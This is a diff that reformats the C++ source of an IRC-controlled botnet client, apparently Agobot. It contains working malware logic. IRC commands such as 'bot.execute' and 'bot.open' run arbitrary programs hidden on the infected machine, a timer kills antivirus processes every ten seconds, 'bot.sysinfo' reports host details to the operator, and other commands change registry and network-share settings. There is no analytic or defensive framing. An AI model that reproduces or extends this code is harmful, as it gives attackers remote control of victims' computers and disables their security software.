@@ -51,27 +51,40 @@ void CBot::Recv(CMessage *pMsg)
         g_cMainCtrl.m_cConsDbg.Log(5, "*%s* %s\n", pMsg->sSrc.CStr(), pMsg->sChatString.CStr());
 #endif
 
-	if(pMsg->sDest[0]=='#') pMsg->sReplyTo.Assign(pMsg->sDest); else pMsg->sReplyTo.Assign(pMsg->sSrc);
-	if(pMsg->bNotice) pMsg->sReplyTo.Assign(pMsg->sSrc);
+    if(pMsg->sDest[0]=='#')
+        pMsg->sReplyTo.Assign(pMsg->sDest);
+    else
+        pMsg->sReplyTo.Assign(pMsg->sSrc);
+    if(pMsg->bNotice)
+        pMsg->sReplyTo.Assign(pMsg->sSrc);
 	pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " ").Mid(1));
 
 	// Check if its a bot command by comparing the first byte to the bot_prefix value
-	if(pMsg->sChatString[0]==bot_prefix.sValue[0]) {
-			if(!pMsg->sCmd.Compare("bot.repeat")) {
-			if(!pMsg->sChatString.Token(1, " ").Compare("")) return;
-			int i=0, iNum=atoi(pMsg->sChatString.Token(1, " ").CStr()); if(!iNum) return;
-			CString sNewCStr=pMsg->sChatString.Mid(pMsg->sChatString.Find(' '));
-			sNewCStr=sNewCStr.Mid(sNewCStr.Find(' '));
-			pMsg->sChatString.Assign(sNewCStr); pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " ").Mid(1));
-			for(i=0;i<iNum;i++) HandleMsg(pMsg); }
-		else
-			HandleMsg(pMsg);
+    if(pMsg->sChatString[0]==bot_prefix.sValue[0])
+    {
+            if(!pMsg->sCmd.Compare("bot.repeat"))
+            {
+                if(!pMsg->sChatString.Token(1, " ").Compare(""))
+                    return;
+                int i=0, iNum=atoi(pMsg->sChatString.Token(1, " ").CStr());
+                if(!iNum)
+                    return;
+                CString sNewCStr=pMsg->sChatString.Mid(pMsg->sChatString.Find(' '));
+                sNewCStr=sNewCStr.Mid(sNewCStr.Find(' '));
+                pMsg->sChatString.Assign(sNewCStr);
+                pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " ").Mid(1));
+                for(i=0;i<iNum;i++)
+                    HandleMsg(pMsg);
+            }else{
+                HandleMsg(pMsg);
+            }
 	} else { //botname .command mod - deejayfuzion
 		if(pMsg->sChatString.Token(0, " ").Find(g_cMainCtrl.m_sUserName)) {
 			CString sNewCStr=pMsg->sChatString.Mid(pMsg->sChatString.Find(' '));
 			pMsg->sChatString.Assign(sNewCStr);
 			pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " "));
-			this->Recv(pMsg); }
+            this->Recv(pMsg);
+        }
 	}
 }
 
@@ -82,28 +95,43 @@ bool CBot::HandleMsg(CMessage *pMsg)
         g_cMainCtrl.m_cConsDbg.Log(10, "*%s* %s  \n", pMsg->sSrc.CStr(), pMsg->sChatString.CStr());
 #endif
     // If it's no login command and the user isn't logged in yet, break
-	if(pMsg->sCmd.Compare("login") && !g_cMainCtrl.m_cMac.FindLogin(pMsg->sSrc)) return false;
+    if(pMsg->sCmd.Compare("login") && !g_cMainCtrl.m_cMac.FindLogin(pMsg->sSrc))
+        return false;
 	else
 	{	// If the user isn't logged in yet, bot_seclogin is enabled and its no channel message, break;
 		if(!g_cMainCtrl.m_cMac.FindLogin(pMsg->sSrc))
-			if(bot_seclogin.bValue) if(pMsg->sDest[0]!='#') return false;
+            if(bot_seclogin.bValue) if(pMsg->sDest[0]!='#')
+                return false;
 		// Find the command using the command handler
 		command *pCommand=g_cMainCtrl.m_cCommands.FindCommandByName(pMsg->sCmd.CStr(), true);
 		// If the command is found, let the command hander handle it
-		if(pCommand) return pCommand->pHandler->HandleCommand(pMsg); else return false; } }
+        if(pCommand)
+            return pCommand->pHandler->HandleCommand(pMsg);
+        else
+            return false;
+    }
+}
 
 bool CBot::Think()
-{	static unsigned long lLastAVKill;
+{
+    static unsigned long lLastAVKill;
 
 	// If the IRC connection timed out, reset it
 	if((GetTickCount()-g_cMainCtrl.m_cIRC.m_lLastRecv) > bot_timeout.iValue)
-	{	g_cMainCtrl.m_cIRC.Fail(); g_cMainCtrl.m_cIRC.m_lLastRecv=GetTickCount(); }
+    {
+        g_cMainCtrl.m_cIRC.Fail();
+        g_cMainCtrl.m_cIRC.m_lLastRecv=GetTickCount();
+    }
 	
 	// Kill all AV processes every 10 seconds
 	if((GetTickCount()-lLastAVKill) > 10000)
-	{	KillAV(); lLastAVKill=GetTickCount(); }
+    {
+        KillAV();
+        lLastAVKill=GetTickCount();
+    }
 
-	return true; }
+    return true;
+}
 
 bool CBot::HandleCommand(CMessage *pMsg)
 {	
@@ -116,36 +144,58 @@ bool CBot::HandleCommand(CMessage *pMsg)
 		if(!pMsg->sCmd.Compare("bot.removeallbut")) if(!sId.Compare(g_cMainCtrl.m_cBot.bot_id.sValue)) return false;
 		g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "removing bot...", pMsg->sReplyTo);
 #ifdef WIN32
-		if(g_cMainCtrl.m_cBot.as_enabled.bValue) g_cMainCtrl.m_cInstaller.RegStartDel(g_cMainCtrl.m_cBot.as_valname.sValue);
+        if(g_cMainCtrl.m_cBot.as_enabled.bValue)
+            g_cMainCtrl.m_cInstaller.RegStartDel(g_cMainCtrl.m_cBot.as_valname.sValue);
 #endif
 		g_cMainCtrl.m_cInstaller.Uninstall();
-		g_cMainCtrl.m_cIRC.m_bRunning=false; g_cMainCtrl.m_bRunning=false; }
+        g_cMainCtrl.m_cIRC.m_bRunning=false;
+        g_cMainCtrl.m_bRunning=false;
+    }
 
 	else if(!pMsg->sCmd.Compare("bot.execute")) {
-		CString sText(pMsg->sChatString.Token(2, " ", true)); bool bVisible=atoi(pMsg->sChatString.Token(1, " ").CStr())==1;
+        CString sText(pMsg->sChatString.Token(2, " ", true));
+        bool bVisible=atoi(pMsg->sChatString.Token(1, " ").CStr())==1;
 #ifdef WIN32
-		CString sTextExp; ExpandEnvironmentStrings(sText.CStr(), sTextExp.GetBuffer(8192), 8192); // interpret environment variables
-		sText.Assign(sTextExp); PROCESS_INFORMATION pinfo; STARTUPINFO sinfo;
-		memset(&sinfo, 0, sizeof(STARTUPINFO)); sinfo.cb=sizeof(sinfo);
-		if(bVisible) sinfo.wShowWindow=SW_SHOW; else sinfo.wShowWindow=SW_HIDE;
+        CString sTextExp;
+        ExpandEnvironmentStrings(sText.CStr(), sTextExp.GetBuffer(8192), 8192); // interpret environment variables
+        sText.Assign(sTextExp);
+        PROCESS_INFORMATION pinfo;
+        STARTUPINFO sinfo;
+        memset(&sinfo, 0, sizeof(STARTUPINFO));
+        sinfo.cb=sizeof(sinfo);
+        if(bVisible)
+            sinfo.wShowWindow=SW_SHOW;
+        else
+            sinfo.wShowWindow=SW_HIDE;
 		if(!CreateProcess(NULL, sText.Str(), NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) {
-			g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "couldn't execute file.", pMsg->sReplyTo.Str()); return false; }
+            g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "couldn't execute file.", pMsg->sReplyTo.Str());
+            return false;
+        }
 #else
 		CString sCmdBuf; sCmdBuf.Format("/bin/sh -c \"%s\"", sText.CStr());
-		if(system(sCmdBuf.CStr())==-1) { g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "couldn't execute file.", pMsg->sReplyTo.Str()); return false; }
+        if(system(sCmdBuf.CStr())==-1) {
+            g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "couldn't execute file.", pMsg->sReplyTo.Str());
+            return false;
+        }
 #endif
-		return true; }
+        return true;
+    }
 
 	else if(!pMsg->sCmd.Compare("bot.open")) {
-		if(!(pMsg->sChatString.GetLength() > (pMsg->sCmd.GetLength()+pMsg->sChatString.Token(1, " ").GetLength()+3))) return false;
-		CString sText; sText.Assign(&pMsg->sChatString[pMsg->sCmd.GetLength()+2]); bool bRet=false;
+        if(!(pMsg->sChatString.GetLength() > (pMsg->sCmd.GetLength()+pMsg->sChatString.Token(1, " ").GetLength()+3)))
+            return false;
+        CString sText;
+        sText.Assign(&pMsg->sChatString[pMsg->sCmd.GetLength()+2]);
+        bool bRet=false;
 #ifdef WIN32
 		bRet=(int)ShellExecute(0, "open", sText.CStr(), NULL, NULL, SW_SHOW)>=32;
 #else
 		bRet=system(sText.CStr())>0;
 #endif
-		if(bRet) return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "file opened.", pMsg->sReplyTo.Str());
-		else return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "couldn't open file.", pMsg->sReplyTo.Str()); }
+        if(bRet)
+            return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "file opened.", pMsg->sReplyTo.Str());
+        else
+            return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "couldn't open file.", pMsg->sReplyTo.Str()); }
 
 	else if(!pMsg->sCmd.Compare("bot.dns")) {
 		CString sReply; hostent *pHostent=NULL; in_addr iaddr;
@@ -156,52 +206,67 @@ bool CBot::HandleCommand(CMessage *pMsg)
 			pHostent=gethostbyaddr((char*)&addr, sizeof(struct in_addr), AF_INET);
 			if(pHostent) {
 				sReply.Format("%s -> %s", pMsg->sChatString.Token(1, " ").CStr(), pHostent->h_name);
-				return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str()); }
+                return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str());
+            }
 		} else {
 			pHostent=gethostbyname(pMsg->sChatString.Token(1, " ").CStr());
 			if(pHostent) {
 				iaddr=*((in_addr*)*pHostent->h_addr_list);
 				sReply.Format("%s -> %s", pMsg->sChatString.Token(1, " ").CStr(), inet_ntoa(iaddr));
-				return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str()); } }
+                return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str());
+            }
+        }
 		
 		if(!pHostent) {
 			sReply.Format("couldn't resolve host \"%s\"!", pMsg->sChatString.Token(1, " ").CStr());
-			return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str()); } }
+            return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str());
+        }
+    }
 
 	else if(!pMsg->sCmd.Compare("bot.about")) {
 		CString sReplyBuf; sReplyBuf.Format("%s by Ago (theago@gmx.net). homepage: http://none.yet/", g_cMainCtrl.m_sNameVerStr.CStr());
-		return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReplyBuf.Str(), pMsg->sReplyTo.Str()); }
+        return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReplyBuf.Str(), pMsg->sReplyTo.Str());
+    }
 
 	else if(!pMsg->sCmd.Compare("bot.id")) {
-		return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, bot_id.sValue.Str(), pMsg->sReplyTo.Str()); }
+        return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, bot_id.sValue.Str(), pMsg->sReplyTo.Str());
+    }
 
 	else if(!pMsg->sCmd.Compare("bot.nick")) {
 		g_cMainCtrl.m_sUserName.Format("%s", pMsg->sChatString.Token(1, " ", true).Mid(0, 32).CStr());
 		g_cMainCtrl.m_cIRC.SendRawFormat("NICK %s\r\n", g_cMainCtrl.m_sUserName.CStr());
-		return true; }
+        return true;
+    }
 
 	else if(!pMsg->sCmd.Compare("bot.quit") || !pMsg->sCmd.Compare("bot.die")) {
-		g_cMainCtrl.m_cIRC.m_bRunning=false; return true; }
+        g_cMainCtrl.m_cIRC.m_bRunning=false;
+        return true;
+    }
 
 	else if(!pMsg->sCmd.Compare("bot.sysinfo")) {
-		return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, SysInfo().Str(), pMsg->sReplyTo.Str()); }
+        return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, SysInfo().Str(), pMsg->sReplyTo.Str());
+    }
 
 	else if(!pMsg->sCmd.Compare("bot.longuptime")) {
 		int iDays=atoi(pMsg->sChatString.Token(1, " ").CStr()); if(!iDays) iDays=7;
 		CString sUptime=LongUptime(iDays);
 		if(sUptime.Compare("")) {
 			g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
-				sUptime.Str(), pMsg->sReplyTo.Str()); }
-		return true; }
+                sUptime.Str(), pMsg->sReplyTo.Str());
+        }
+        return true;
+    }
 
 	else if(!pMsg->sCmd.Compare("bot.status")) {
-		return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, Status().Str(), pMsg->sReplyTo.Str()); }
+        return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, Status().Str(), pMsg->sReplyTo.Str());
+    }
 
 	else if(!pMsg->sCmd.Compare("bot.rndnick")) {
 		CString sRndNick=RndNick(si_nickprefix.sValue.CStr());
 		g_cMainCtrl.m_cIRC.SendRawFormat("NICK %s\r\n", sRndNick.CStr());
 		g_cMainCtrl.m_sUserName.Format("%s", sRndNick.Mid(0, 32).CStr());
-		return true; }
+        return true;
+    }
 
 	else if(!pMsg->sCmd.Compare("bot.flushdns")) {
 #ifdef WIN32
@@ -214,8 +279,11 @@ bool CBot::HandleCommand(CMessage *pMsg)
 	else if(!pMsg->sCmd.Compare("bot.secure")) {	
 #ifdef WIN32
 		// Set EnableDCOM to "N"
-		HKEY hkey=NULL; DWORD dwSize=128; char szDataBuf[128];
-		sprintf(szDataBuf, "N"); dwSize=strlen(szDataBuf);
+        HKEY hkey=NULL;
+        DWORD dwSize=128;
+        char szDataBuf[128];
+        sprintf(szDataBuf, "N");
+        dwSize=strlen(szDataBuf);
 		LONG lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\OLE", 0, KEY_READ, &hkey);
 		RegSetValueEx(hkey, "EnableDCOM", NULL, REG_SZ, (unsigned char*)szDataBuf, dwSize);
 		RegCloseKey(hkey);
@@ -226,22 +294,27 @@ bool CBot::HandleCommand(CMessage *pMsg)
 		system("net share ipc$ /delete /y");
 		system("net share admin$ /delete /y");
 #endif
-		return true; }
+        return true;
+    }
 
-	return false; }
+    return false;
+}
 
 CString CBot::SysInfo()
 {	CString sSysInfo;
 #ifdef WIN32
 	int total=GetTickCount()/1000;
-	MEMORYSTATUS memstat; OSVERSIONINFO verinfo;
+    MEMORYSTATUS memstat;
+    OSVERSIONINFO verinfo;
 	char szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
 	DWORD dwNameSize = MAX_COMPUTERNAME_LENGTH + 1;
 	char *szCompname;
 	TCHAR szUserName[21];
 	DWORD dwUserSize = sizeof(szUserName);
 
-	GlobalMemoryStatus(&memstat); verinfo.dwOSVersionInfoSize=sizeof(OSVERSIONINFO); GetVersionEx(&verinfo); char *os; char os2[140];
+    GlobalMemoryStatus(&memstat);
+    verinfo.dwOSVersionInfoSize=sizeof(OSVERSIONINFO);
+    GetVersionEx(&verinfo); char *os; char os2[140];
 	if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==0)
 	{	if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)			os="95";
 		if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_NT)					os="NT"; }
@@ -321,6 +394,12 @@ CString CBot::LongUptime(int iDays)  // If uptime > iDays days then bot will rep
 	return sLongUptime; }
 
 CString CBot::Status()
-{	CString sStatus; unsigned long total, days, hours, minutes; total=(GetTickCount()/1000)-m_lStartTime;
-	days=total/86400; hours=(total%86400)/3600; minutes=((total%86400)%3600)/60;
-	sStatus.Format("%s ready. Up %dd %dh %dm.", g_cMainCtrl.m_sNameVerStr.CStr(), days, hours, minutes); return sStatus; }
+{	CString sStatus;
+    unsigned long total, days, hours, minutes;
+    total=(GetTickCount()/1000)-m_lStartTime;
+    days=total/86400;
+    hours=(total%86400)/3600;
+    minutes=((total%86400)%3600)/60;
+    sStatus.Format("%s ready. Up %dd %dh %dm.", g_cMainCtrl.m_sNameVerStr.CStr(), days, hours, minutes);
+    return sStatus;
+}
